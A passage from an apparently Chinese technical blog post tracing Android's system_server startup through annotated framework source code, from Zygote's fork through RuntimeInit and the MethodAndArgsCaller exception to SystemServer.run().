class="hljs-comment">//进入子进程</span><br>    DetachDescriptors(env, fdsToClose); <span class="hljs-comment">//关闭并清除文件描述符</span><br><br>    <span class="hljs-keyword">if</span> (!is_system_server) &#123;<br>        <span class="hljs-comment">//对于非system_server子进程，则创建进程组</span><br>        <span class="hljs-keyword">int</span> rc = createProcessGroup(uid, getpid());<br>    &#125;<br>    SetGids(env, javaGids); <span class="hljs-comment">//设置设置group</span><br>    SetRLimits(env, javaRlimits); <span class="hljs-comment">//设置资源limit</span><br><br>    <span class="hljs-keyword">int</span> rc = setresgid(gid, gid, gid);<br>    rc = setresuid(uid, uid, uid);<br><br>    SetCapabilities(env, permittedCapabilities, effectiveCapabilities);<br>    SetSchedulerPolicy(env); <span class="hljs-comment">//设置调度策略</span><br><br>     <span class="hljs-comment">//selinux上下文</span><br>    rc = selinux_android_setcontext(uid, is_system_server, se_info_c_str, se_name_c_str);<br><br>    <span class="hljs-keyword">if</span> (se_info_c_str == <span class="hljs-literal">NULL</span> &amp;&amp; is_system_server) &#123;<br>      se_name_c_str = <span class="hljs-string">&quot;system_server&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (se_info_c_str != <span class="hljs-literal">NULL</span>) &#123;<br>      SetThreadName(se_name_c_str); <span class="hljs-comment">//设置线程名为system_server，方便调试</span><br>    &#125;<br>    UnsetSigChldHandler(); <span class="hljs-comment">//设置子进程的signal信号处理函数为默认函数</span><br>    <span class="hljs-comment">//等价于调用zygote.callPostForkChildHooks()</span><br>    env-&gt;CallStaticVoidMethod(gZygoteClass, gCallPostForkChildHooks, debug_flags,<br>                              is_system_server ? <span class="hljs-literal">NULL</span> : instructionSet);<br>    ...<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">//进入父进程，即zygote进程</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-keyword">int</span> fork() &#123;<br>  __bionic_atfork_run_prepare(); <br><br>  pthread_internal_t* <span class="hljs-built_in">self</span> = __get_thread();<br><br>  <span class="hljs-comment">//fork期间，获取父进程pid，并使其缓存值无效</span><br>  pid_t parent_pid = <span class="hljs-built_in">self</span>-&gt;invalidate_cached_pid();<br>  <span class="hljs-comment">//系统调用</span><br>  <span class="hljs-keyword">int</span> result = syscall(__NR_clone, FORK_FLAGS, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;(<span class="hljs-built_in">self</span>-&gt;tid));<br>  <span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">self</span>-&gt;set_cached_pid(gettid());<br>    __bionic_atfork_run_child(); <span class="hljs-comment">//fork完成执行子进程回调方法</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">self</span>-&gt;set_cached_pid(parent_pid);<br>    __bionic_atfork_run_parent(); <span class="hljs-comment">//fork完成执行父进程回调方法</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>到此system_server进程已完成了创建的所有工作，接下来开始了system_server进程的真正工作。在前面startSystemServer()方法中，zygote进程执行完forkSystemServer()后，新创建出来的system_server进程便进入handleSystemServerProcess()方法</p><h3 id="2-15-ZygoteInit-handleSystemServerProcess"><a href="#2-15-ZygoteInit-handleSystemServerProcess" class="headerlink" title="2.15 ZygoteInit.handleSystemServerProcess()"></a>2.15 ZygoteInit.handleSystemServerProcess()</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> handleSystemServerProcess(<br>        ZygoteConnection.Arguments parsedArgs)<br>        <span class="hljs-keyword">throws</span> ZygoteInit.MethodAndArgsCaller &#123;<br><br>    closeServerSocket(); <span class="hljs-comment">//关闭父进程zygote复制而来的Socket</span><br><br>    Os.umask(S_IRWXG | S_IRWXO);<br><br>    <span class="hljs-keyword">if</span> (parsedArgs.niceName != <span class="hljs-keyword">null</span>) &#123;<br>        Process.setArgV0(parsedArgs.niceName); <span class="hljs-comment">//设置当前进程名为&quot;system_server&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> systemServerClasspath = Os.getenv(<span class="hljs-string">&quot;SYSTEMSERVERCLASSPATH&quot;</span>);<br>    <span class="hljs-keyword">if</span> (systemServerClasspath != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">//执行dex优化操作</span><br>        performSystemServerDexOpt(systemServerClasspath);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (parsedArgs.invokeWith != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">String</span>[] args = parsedArgs.remainingArgs;<br><br>        <span class="hljs-keyword">if</span> (systemServerClasspath != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">String</span>[] amendedArgs = <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[args.length + <span class="hljs-number">2</span>];<br>            amendedArgs[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;-cp&quot;</span>;<br>            amendedArgs[<span class="hljs-number">1</span>] = systemServerClasspath;<br>            System.arraycopy(parsedArgs.remainingArgs, <span class="hljs-number">0</span>, amendedArgs, <span class="hljs-number">2</span>, parsedArgs.remainingArgs.length);<br>        &#125;<br>        <span class="hljs-comment">//启动应用进程</span><br>        WrapperInit.execApplication(parsedArgs.invokeWith,<br>                parsedArgs.niceName, parsedArgs.targetSdkVersion,<br>                VMRuntime.getCurrentInstructionSet(), <span class="hljs-keyword">null</span>, args);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ClassLoader cl = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">if</span> (systemServerClasspath != <span class="hljs-keyword">null</span>) &#123;<br>            创建类加载器，并赋予当前线程<br>            cl = <span class="hljs-keyword">new</span> PathClassLoader(systemServerClasspath, ClassLoader.getSystemClassLoader());<br>            Thread.currentThread().setContextClassLoader(cl);<br>        &#125;<br><br>        <span class="hljs-comment">//system_server故进入此分支</span><br>        RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs, cl);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-16-RuntimeInit-zygoteInit"><a href="#2-16-RuntimeInit-zygoteInit" class="headerlink" title="2.16 RuntimeInit.zygoteInit()"></a>2.16 RuntimeInit.zygoteInit()</h3><p>源码位于frameworks/base/core/java/com/android/internal/os/RuntimeInit.java</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static final void zygote<span class="hljs-constructor">Init(<span class="hljs-params">int</span> <span class="hljs-params">targetSdkVersion</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">Begin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="hljs-string">&quot;RuntimeInit&quot;</span>)</span>;<br>    redirect<span class="hljs-constructor">LogStreams()</span>; <span class="hljs-comment">//重定向log输出</span><br><br>    common<span class="hljs-constructor">Init()</span>; <span class="hljs-comment">// 通用的一些初始化</span><br>    native<span class="hljs-constructor">ZygoteInit()</span>; <span class="hljs-comment">// zygote初始化 </span><br>    application<span class="hljs-constructor">Init(<span class="hljs-params">targetSdkVersion</span>, <span class="hljs-params">argv</span>, <span class="hljs-params">classLoader</span>)</span>; <span class="hljs-comment">// 应用初始化</span><br>&#125;<br><br><span class="hljs-keyword">private</span> static final void common<span class="hljs-constructor">Init()</span> &#123;<br>    <span class="hljs-comment">// 设置默认的未捕捉异常处理方法</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>set<span class="hljs-constructor">DefaultUncaughtExceptionHandler(<span class="hljs-params">new</span> UncaughtHandler()</span>);<br><br>    <span class="hljs-comment">// 设置市区，中国时区为&quot;Asia/Shanghai&quot;</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TimezoneGetter</span>.</span></span>set<span class="hljs-constructor">Instance(<span class="hljs-params">new</span> TimezoneGetter()</span> &#123;<br>        @Override<br>        public String get<span class="hljs-constructor">Id()</span> &#123;<br>            return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SystemProperties</span>.</span></span>get(<span class="hljs-string">&quot;persist.sys.timezone&quot;</span>);<br>        &#125;<br>    &#125;);<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TimeZone</span>.</span></span>set<span class="hljs-constructor">Default(<span class="hljs-params">null</span>)</span>;<br><br>    <span class="hljs-comment">//重置log配置</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LogManager</span>.</span></span>get<span class="hljs-constructor">LogManager()</span>.reset<span class="hljs-literal">()</span>;<br>    <span class="hljs-keyword">new</span> <span class="hljs-constructor">AndroidConfig()</span>;<br><br>    <span class="hljs-comment">// 设置默认的HTTP User-agent格式( &quot;Dalvik/1.1.0 (Linux; U; Android 6.0.1；LenovoX3c70 Build/LMY47V)&quot;),用于 HttpURLConnection</span><br>    String userAgent = get<span class="hljs-constructor">DefaultUserAgent()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;http.agent&quot;</span>, <span class="hljs-params">userAgent</span>)</span>;<br><br>    <span class="hljs-comment">// 设置socket的tag，用于网络流量统计</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NetworkManagementSocketTagger</span>.</span></span>install<span class="hljs-literal">()</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> static void application<span class="hljs-constructor">Init(<span class="hljs-params">int</span> <span class="hljs-params">targetSdkVersion</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br>    <span class="hljs-comment">//true代表应用程序退出时不调用AppRuntime.onExit()，否则会在退出前调用</span><br>    native<span class="hljs-constructor">SetExitWithoutCleanup(<span class="hljs-params">true</span>)</span>;<br><br>    <span class="hljs-comment">//设置虚拟机的内存利用率参数值为0.75</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VMRuntime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.set<span class="hljs-constructor">TargetHeapUtilization(0.75f)</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VMRuntime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.set<span class="hljs-constructor">TargetSdkVersion(<span class="hljs-params">targetSdkVersion</span>)</span>;<br><br>    final Arguments args;<br>    <span class="hljs-keyword">try</span> &#123;<br>        args = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Arguments(<span class="hljs-params">argv</span>)</span>; <span class="hljs-comment">//解析参数</span><br>    &#125; catch (IllegalArgumentException ex) &#123;<br>        return;<br>    &#125;<br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">End(Trace.TRACE_TAG_ACTIVITY_MANAGER)</span>;<br><br>    <span class="hljs-comment">//调用startClass的static方法 main() 此处args.startClass为”com.android.server.SystemServer”</span><br>    invoke<span class="hljs-constructor">StaticMain(<span class="hljs-params">args</span>.<span class="hljs-params">startClass</span>, <span class="hljs-params">args</span>.<span class="hljs-params">startArgs</span>, <span class="hljs-params">classLoader</span>)</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> static void invoke<span class="hljs-constructor">StaticMain(String <span class="hljs-params">className</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br>    Class&lt;?&gt; cl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">classLoader</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator">    </span>Method m;<br>    <span class="hljs-keyword">try</span> &#123;<br>        m = cl.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-params">new</span> Class[] &#123; String[].<span class="hljs-params">class</span> &#125;)</span>;<br>    &#125; catch (NoSuchMethodException ex) &#123;<span class="hljs-operator"></span><br><span class="hljs-operator">        ...</span><br><span class="hljs-operator">    </span>&#125; catch (SecurityException ex) &#123;<span class="hljs-operator"></span><br><span class="hljs-operator">        ...</span><br><span class="hljs-operator">    </span>&#125;<br><br>    <span class="hljs-comment">//通过抛出异常，回到ZygoteInit.main()。这样做好处是能清空栈帧，提高栈帧利用率</span><br>    throw <span class="hljs-keyword">new</span> ZygoteInit.<span class="hljs-constructor">MethodAndArgsCaller(<span class="hljs-params">m</span>, <span class="hljs-params">argv</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点看最后一个方法，通过反射获取SystemServer类的main方法参数，然后抛出MethodAndArgsCaller异常；但是抛出异常后怎么弄呢，我们知道一个方法抛异常，会一直走到调用方法，直到一个方法捕获了异常，这里就是开头讲的，在ZygoteInit.main方法捕获了异常然后去执行</p><h3 id="2-17-ZygoteInit-main"><a href="#2-17-ZygoteInit-main" class="headerlink" title="2.17 ZygoteInit.main()"></a>2.17 ZygoteInit.main()</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span> argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (startSystemServer) &#123;<br>            <span class="hljs-built_in">startSystemServer</span>(abiList, socketName);<span class="hljs-comment">//启动system_server</span><br>        &#125;<br>    &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (MethodAndArgsCaller caller) &#123;<br>        caller.<span class="hljs-built_in">run</span>();<br>    &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RuntimeException ex) &#123;<br>        <span class="hljs-built_in">closeServerSocket</span>();<br>        <span class="hljs-keyword">throw</span> ex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是为啥没有直接在startSystemServer()或者上面的方法中直接调用SystemServer类的main方法，而是通过抛异常的方式处理呢？</p><p>我们知道，当一个函数抛出异常后，这个异常会依次传递给调用它的函数，直到这个异常被捕获，如果这个异常一直没有被处理，最终就会引起程序的崩溃。</p><p>程序都是由一个个函数组成的(除了汇编程序)，c/c++/java/…等高级语言编写的应用程序，在执行的时候，他们都拥有自己的栈空间（是一种先进后出的内存区域），用于存放函数的返回地址和函数的临时数据，每调用一个函数时，就会把函数的返回地址和相关数据压入栈中，当一个函数执行完后，就会从栈中弹出，cpu会根据函数的返回地址，执行上一个调用函数的下一条指令。</p><p>所以，在抛出异常后，如果异常没有在当前的函数中捕获，那么当前的函数执行就会异常的退出，从应用程序的栈弹出，并将这个异常传递给上一个函数，直到异常被捕获处理，否则，就会引起程序的崩溃。</p><p>因此，这里通过抛异常的方式启动主要是清理应用程序栈中ZygoteInit.main以上的函数栈帧，以实现当相应的main函数退出时，能直接退出整个应用程序</p><h3 id="2-18-ZygoteInit-MethodAndArgsCaller-run"><a href="#2-18-ZygoteInit-MethodAndArgsCaller-run" class="headerlink" title="2.18 ZygoteInit.MethodAndArgsCaller.run()"></a>2.18 ZygoteInit.MethodAndArgsCaller.run()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodAndArgsCaller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span></span><br><span class="hljs-class">            <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span> </span>&#123;<br>        <span class="hljs-comment">/** 调用的方法 在上面的方法可知是main方法 */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Method mMethod;<br><br>        <span class="hljs-comment">/** 参数列表 */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span>[] mArgs;<br><br>        <span class="hljs-keyword">public</span> MethodAndArgsCaller(Method method, <span class="hljs-keyword">String</span>[] args) &#123;<br>            mMethod = method;<br>            mArgs = args;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> run() &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                mMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">Object</span>[] &#123; mArgs &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(ex);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>                <span class="hljs-built_in">Throwable</span> cause = ex.getCause();<br>                <span class="hljs-keyword">if</span> (cause <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">RuntimeException</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-built_in">RuntimeException</span>) cause;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cause <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Error</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-built_in">Error</span>) cause;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(ex);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到这里根据传递过来的参数，可知此处通过反射机制调用的是SystemServer.main()方法；到此，总算是进入到了SystemServer类的main()方法</p><h3 id="2-19-SystemServer-main"><a href="#2-19-SystemServer-main" class="headerlink" title="2.19 SystemServer.main()"></a>2.19 SystemServer.main()</h3><p>源码位于 frameworks/base/services/java/com/android/server/SystemServer.java </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span>[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">SystemServer</span>().<span class="hljs-built_in">run</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-comment">//如果系统时间比1970年早，那就设置为1970</span><br>            <span class="hljs-keyword">if</span> (System.<span class="hljs-built_in">currentTimeMillis</span>() &lt; EARLIEST_SUPPORTED_TIME) &#123;<br>                SystemClock.<span class="hljs-built_in">setCurrentTimeMillis</span>(EARLIEST_SUPPORTED_TIME);<br>            &#125;<br><br>            <span class="hljs-comment">//变更虚拟机的库文件，对于Android 6.0默认采用的是libart.so</span><br>            SystemProperties.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;persist.sys.dalvik.vm.lib.2&quot;</span>, VMRuntime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">vmLibrary</span>());<br><br>            <span class="hljs-comment">//清除vm内存增长上限，由于启动过程需要较多的虚拟机内存空间</span><br>            VMRuntime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">clearGrowthLimit</span>();<br><br>            <span class="hljs-comment">//设置内存的可能有效使用率为0.8</span><br>            VMRuntime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">setTargetHeapUtilization</span>(<span class="hljs-number">0.8f</span>);<br><br>            <span class="hljs-comment">// 针对部分设备依赖于运行时就产生指纹信息，因此需要在开机完成前已经定义</span><br>            Build.<span class="hljs-built_in">ensureFingerprintProperty</span>();<br><br>            <span class="hljs-comment">//访问环境变量前，需要明确地指定用户</span><br>            Environment.<span class="hljs-built_in">setUserRequired</span>(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// Within the system server, any incoming Bundles should be defused</span><br>            <span class="hljs-comment">// to avoid throwing BadParcelableException.</span><br>            BaseBundle.<span class="hljs-built_in">setShouldDefuse</span>(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">//确保当前系统进程的binder调用，总是运行在前台优先级(foreground priority)</span><br>            BinderInternal.<span class="hljs-built_in">disableBackgroundScheduling</span>(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// 增加system_server中的binder线程数</span><br>            BinderInternal.<span class="hljs-built_in">setMaxThreads</span>(sMaxBinderThreads);<br><br>            <span class="hljs-comment">// 创建主线程looper 在当前线程运行</span><br>            android.os.<span class="hljs-built_in">Process</span>.<span class="hljs-built_in">setThreadPriority</span>(<br>                android.os.<span class="hljs-built_in">Process</span>.THREAD_PRIORITY_FOREGROUND);<br>            android.os.<span class="hljs-built_in">Process</span>.<span class="hljs-built_in">setCanSelfBackground</span>(<span class="hljs-literal">false</span>);<br>            Looper.<span class="hljs-built_in">prepareMainLooper</span>();<br><br>            <span class="hljs-comment">//初始化android_servers库</span><br>            System.<span class="hljs-built_in">loadLibrary</span>(<span class="hljs-string">&quot;android_servers&quot;</span>);<br><br>            <span class="hljs-comment">//检测上次关机过程是否失败</span><br>            <span class="hljs-built_in">performPendingShutdown</span>();<br><br>            <span class="hljs-comment">//初始化系统上下文</span><br>            <span class="hljs-comment">//初始化系统上下文对象mSystemContext，并设置默认的主题,mSystemContext实际上是一个ContextImpl对象。</span><br>            <span class="hljs-comment">//调用ActivityThread.systemMain()的时候，会调用ActivityThread.attach(true)，而在attach()里面，则创建了Application对象，并调用了Application.onCreate()。</span><br>            <span class="hljs-built_in">createSystemContext</span>();<br><br>            <span class="hljs-comment">//创建系统服务管理</span><br>            mSystemServiceManager = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SystemServiceManager</span>(mSystemContext);<br>            LocalServices.<span class="hljs-built_in">addService</span>(SystemServiceManager.class, mSystemServiceManager);<br>        &#125; finally &#123;<br>            Trace.<span class="hljs-built_in">traceEnd</span>(Trace.TRACE_TAG_SYSTEM_SERVER);<br>        &#125;<br><br>        <span class="hljs-comment">//启动各种系统服务</span><br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//引导服务</span><br>            <span class="hljs-built_in">startBootstrapServices</span>();<br>            <span class="hljs-comment">//核心服务</span><br>            <span class="hljs-built_in">startCoreServices</span>();<br>            <span class="hljs-comment">//其它服务</span><br>            <span class="hljs-built_in">startOtherServices</span>();<br>        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (Throwable ex) &#123;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125; finally &#123;<br>            Trace.<span class="hljs-built_in">traceEnd</span>(Trace.TRACE_TAG_SYSTEM_SERVER);<br>        &#125;<br><br>        <span class="hljs-comment">//开启消息循环</span><br>        Looper.<span class="hljs-built_in">loop</span>();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&quot;Main thread loop unexpectedly exited&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>至此system_server已启动完成,大致流程如下:</p><ol><li>zygote进程通过Zygote.forkSystemServer —&gt; fork.fork()创建system server进程</li><li>调用ZygoteInit.handleSystemServerProcess方法设置当前进程名为”system_server”，执行dex优化操作，一些属性的初始化，设置binder线程</li><li>通过抛出MethodAndArgsCaller异常，回到ZygoteInit.main()，在try 